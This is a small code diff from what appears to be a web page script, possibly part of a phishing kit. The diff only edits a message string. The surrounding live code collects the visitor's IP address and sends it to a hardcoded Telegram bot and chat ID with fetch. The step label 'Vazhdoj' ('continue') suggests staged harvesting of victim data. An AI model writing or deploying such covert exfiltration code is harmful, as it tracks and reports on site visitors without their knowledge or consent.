@@ -41,7 +41,7 @@
         const chatId = '6395775304';
         getUserIP()
         .then(ip => {
-            const message = `Second Telegram - Vazhdoj: ${ip}`;
+            const message = `Vazhdoj: ${ip}`;
             
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .then(response => {
